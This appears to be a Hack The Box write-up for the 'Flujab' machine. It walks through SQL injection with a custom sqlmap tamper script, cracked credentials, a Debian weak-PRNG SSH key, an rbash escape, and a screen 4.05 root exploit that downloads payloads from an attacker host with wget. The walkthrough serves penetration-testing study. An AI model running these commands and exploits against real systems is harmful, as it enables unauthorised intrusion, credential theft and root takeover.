<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
        <span class="n">retVal</span> <span class="o">=</span> <span class="n">retVal</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"CASE WHEN"</span><span class="p">,</span> <span class="s">"IF("</span><span class="p">)</span>
        <span class="n">retVal</span> <span class="o">=</span> <span class="n">retVal</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"THEN 1 ELSE 0 END"</span><span class="p">,</span> <span class="s">",1,0)"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">retVal</span>
</code></pre></div></div>

<p>The final sqlmap command is: <code class="language-plaintext highlighter-rouge">sqlmap --threads 1 -r /root/htb/flujab/flujab.req --risk=3 -p nhsnum --random-agent --proxy=http://127.0.0.1:8080 --second-url http://127.0.0.1/test.txt --tamper delete --force-ssl --technique u --union-cols 5 --union-char 1 -vv --suffix " #" --dbms=mysql --tamper unionalltounion --tamper 0x2char --tamper case</code></p>

<p>It’s not fast but after a few minutes it found the injection point:</p>

<p><img src="/assets/images/htb-writeup-flujab/sql6.png" alt="" /></p>

<p>Now that we have the injection working in sqlmap, I was able to dump the list of databases:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] information_schema
[*] MedStaff
[*] mysql
[*] openmrs
[*] performance_schema
[*] phplist
[*] vaccinations
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">vaccinations</code> database contains the following tables:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+------------------------+
| user                   |
| admin                  |
| admin_attribute        |
| admin_password_request |
| adminattribute         |
| admintoken             |
| eventlog               |
[...]
</code></pre></div></div>

<p>I dumped the <code class="language-plaintext highlighter-rouge">admin</code> table and found some credentials and a vhost that I previously didn’t have: <code class="language-plaintext highlighter-rouge">sysadmin-console-01.flujab.htb</code></p>

<p><img src="/assets/images/htb-writeup-flujab/sql7.png" alt="" /></p>

<p>The hash was easily cracked with john and rockyou.txt:</p>

<ul>
  <li>sysadm / th3doct0r</li>
</ul>

<h3 id="access-to-the-smtp-configuration-page">Access to the SMTP configuration page</h3>

<p>The admin panel is running the Ajenti application:</p>

<p><img src="/assets/images/htb-writeup-flujab/webadmin1.png" alt="" /></p>

<p>We can log in with the <code class="language-plaintext highlighter-rouge">sysadm</code> credentials we found in the database, and we can use the Notepad tool to read &amp; write files:</p>

<p><img src="/assets/images/htb-writeup-flujab/webadmin2.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">/home/drno</code> folder contains two interesting files in the <code class="language-plaintext highlighter-rouge">.ssh</code> directory:</p>

<p><img src="/assets/images/htb-writeup-flujab/webadmin3.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">userkey</code> file contains an encrypted SSH private key that we can crack with ssh2john / john (password: shadowtroll) but we can’t use it because it doesn’t match the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. <code class="language-plaintext highlighter-rouge">authorized_keys</code> contains a hint about whitelisting but other than that it doesn’t seem possible to exploit this since we don’t have the matching private key.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># shell whitelisting + key auth enabled 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=
</code></pre></div></div>

<p>However after looking for a bit, I found the <code class="language-plaintext highlighter-rouge">/etc/ssh/deprecated_keys</code> directory that contains the following files:</p>

<p><img src="/assets/images/htb-writeup-flujab/webadmin4.png" alt="" /></p>

<p>README.txt has the following message:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Copies of compromised keys will be kept here for comparison until all staff 
have carried out PAM update as per the surgery security notification email.

!!! DO NOT RE-USE ANY KEYS LINKED TO THESE !!! 


UPDATE..
All bad priv keys have now been deleted, only pub keys are retained 
for audit purposes.
</code></pre></div></div>

<p>I remember from my OSCP days that there was a vulnerability in an old Debian release where:</p>

<blockquote>
  <p>All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.</p>
</blockquote>

<p><a href="https://github.com/g0tmi1k/debian-ssh">Debian OpenSSL Predictable PRNG</a></p>

<p>So basically we just need to look through the repo and find the matching private key for DrNo’s public key.</p>

<p>Getting the public key fingerprint:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~/htb/flujab# ssh-keygen -l -E md5 -f 5.pub | tr -d ":"
4096 MD5dead0b5b829ea2e3d22f47a7cbde17a6 drno@flujab.htb (RSA)
</code></pre></div></div>

<p>Finding the matching private key:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~/debian-ssh# ls -lR | grep dead0b5b829ea2e3d22f47a7cbde17a6
-rw------- 1 root root 3239 May 14  2008 dead0b5b829ea2e3d22f47a7cbde17a6-23269
-rw-r--r-- 1 root root  740 May 14  2008 dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub

root@ragingunicorn:~/debian-ssh# find ./ -name dead0b5b829ea2e3d22f47a7cbde17a6-23269
./uncommon_keys/rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269
</code></pre></div></div>

<p>We still can’t connect to the SSH service though, we need to fix that first. The <code class="language-plaintext highlighter-rouge">/etc/ssh/sshd_wl</code> file is a whitelist that can be modified so we can add our IP address.</p>

<p><img src="/assets/images/htb-writeup-flujab/webadmin5.png" alt="" /></p>

<p>We can then log in with private key from <code class="language-plaintext highlighter-rouge">drno</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~/debian-ssh/uncommon_keys/rsa/4096# ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@10.10.10.124
Linux flujab 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
rbash: dircolors: command not found
drno@flujab:~$ cat user.txt
c519aa...
</code></pre></div></div>

<h3 id="privesc">Privesc</h3>

<p>We seem to be stuck in a rbash restricted shell, we need to escape that first:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>drno@flujab:~$ ls -l/
user.txt
drno@flujab:~$ cat user.txt
c519aa...
drno@flujab:~$ cd ..
rbash: cd: restricted
</code></pre></div></div>

<p>Escape is easy with <code class="language-plaintext highlighter-rouge">-t bash --norc --noprofile</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~/debian-ssh/uncommon_keys/rsa/4096# ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@10.10.10.124 -t bash --norc --noprofile
bash-4.4$ cd /
bash-4.4$ ps
  PID TTY          TIME CMD
 1151 pts/0    00:00:00 bash
 1152 pts/0    00:00:00 ps
bash-4.4$ whoami
drno
bash-4.4$ id
uid=1000(drno) gid=1000(drno) groups=1000(drno),1002(super),1003(medic),1004(drugs),1005(doctor)
</code></pre></div></div>

<p>Two copies of the screen program were found on the system, the 2nd one is suid so it will execute as root.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.4$ ls -l /usr/bin/screen
-rwSr-xr-x 1 root utmp 457608 Dec  9 22:02 /usr/bin/screen
bash-4.4$ ls -l /usr/local/share/screen/screen
-rwsr-xr-x 1 root root 1543016 Nov 27 13:49 /usr/local/share/screen/screen
</code></pre></div></div>

<blockquote>
  <p>‘S’ = setgid bit is set, but the execute bit isn’t set.
‘s’ = setgid bit is set, and the execute bit is set.</p>
</blockquote>

<p>After checking the version, there is an exploit available for screen:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.4$ /usr/local/share/screen/screen --version
Screen version 4.05.00 (GNU) 10-Dec-16
</code></pre></div></div>

<p><a href="https://www.exploit-db.com/exploits/41154">https://www.exploit-db.com/exploits/41154</a></p>

<p>First, we’ll just compile the exploit:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:/tmp# gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
</code></pre></div></div>

<p>Next, we upload it to the server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.4$ cd /tmp
bash-4.4$ wget 10.10.14.23:4444/rootshell
--2019-01-30 03:27:16--  http://10.10.14.23:4444/rootshell
Connecting to 10.10.14.23:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16824 (16K) [application/octet-stream]
Saving to: ‘rootshell’

rootshell                                              16.43K  --.-KB/s    in 0.008s  

2019-01-30 03:27:16 (2.05 MB/s) - ‘rootshell’ saved [16824/16824]

bash-4.4$ wget 10.10.14.23:4444/libhax.so
--2019-01-30 03:27:25--  http://10.10.14.23:4444/libhax.so
Connecting to 10.10.14.23:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16136 (16K) [application/octet-stream]
Saving to: ‘libhax.so’

libhax.so                                              15.76K  --.-KB/s    in 0.008s  

2019-01-30 03:27:25 (1.94 MB/s) - ‘libhax.so’ saved [16136/16136]

bash-4.4$ chmod +x rootshell
</code></pre></div></div>

<p>Then execute it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.4$ chmod +x rootshell
bash-4.4$ cd /etc
bash-4.4$ umask 000
bash-4.4$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
Directory '/run/screen' must have mode 755.
bash-4.4$ screen -ls
Directory '/run/screen' must have mode 755.
bash-4.4$ /tmp/rootshell
$
</code></pre></div></div>

<p>Uh? No root privileges?</p>

<p>Oh… I forgot to use the correct binary in <code class="language-plaintext highlighter-rouge">/usr/local/share/screen</code> which is setuid. Let’s try again with the right path:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.4$ /usr/local/share/screen/screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
bash-4.4$ /usr/local/share/screen/screen -ls
No Sockets found in /tmp/screens/S-drno.

bash-4.4$ /tmp/rootshell
# id
uid=0(root) gid=0(root) groups=0(root),1000(drno),1002(super),1003(medic),1004(drugs),1005(doctor)
# cat /root/root.txt
70817...
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">enumeration</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#exploit" class="page__taxonomy-item" rel="tag">exploit</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#screen" class="page__taxonomy-item" rel="tag">screen</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#smtp" class="page__taxonomy-item" rel="tag">smtp</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#tamper-script" class="page__taxonomy-item" rel="tag">tamper script</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#waf" class="page__taxonomy-item" rel="tag">waf</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#weak-ssh-keys" class="page__taxonomy-item" rel="tag">weak ssh keys</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-06-15T00:00:00+02:00">June 15, 2019</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-help/" class="pagination--pager" title="Help - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-querier/" class="pagination--pager" title="Querier - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
